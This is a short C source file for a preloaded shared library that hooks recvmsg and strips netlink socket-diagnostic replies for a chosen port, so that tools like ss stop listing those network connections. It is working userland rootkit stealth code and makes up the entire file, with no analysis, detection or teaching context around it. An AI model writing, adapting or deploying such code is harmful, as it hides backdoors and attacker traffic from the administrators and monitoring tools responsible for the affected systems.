#define _GNU_SOURCE
#include <string.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <linux/sock_diag.h>
#include <arpa/inet.h>

static int is_target_msg(struct nlmsghdr *nlh) {
    if (nlh->nlmsg_type != SOCK_DIAG_BY_FAMILY && nlh->nlmsg_type != 18) return 0;
    if (nlh->nlmsg_len < NLMSG_LENGTH(sizeof(struct inet_diag_msg))) return 0;
    
    struct inet_diag_msg *msg = NLMSG_DATA(nlh);
    if (ntohs(msg->id.idiag_sport) == PORT_TO_HIDE || ntohs(msg->id.idiag_dport) == PORT_TO_HIDE) return 1;
    return 0;
}

ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    static ssize_t (*orig_recvmsg)(int, struct msghdr*, int) = NULL;
    if (!orig_recvmsg) orig_recvmsg = dlsym(RTLD_NEXT, "recvmsg");

    ssize_t ret = orig_recvmsg(sockfd, msg, flags);
    if (ret <= 0 || !msg->msg_iov || !msg->msg_iov->iov_base) return ret;

    struct nlmsghdr *nlh = (struct nlmsghdr *)msg->msg_iov->iov_base;
    int remaining = (int)ret;
    while (NLMSG_OK(nlh, remaining)) {
        if (nlh->nlmsg_type == NLMSG_DONE) break;
        if (is_target_msg(nlh)) {
            size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
            char *next_msg = (char *)nlh + msg_len;
            int bytes_after = remaining - msg_len;
            if (bytes_after > 0) memmove(nlh, next_msg, bytes_after);
            ret -= msg_len;
            remaining -= msg_len;
            continue;
        }
        nlh = NLMSG_NEXT(nlh, remaining);
    }
    return ret;
}


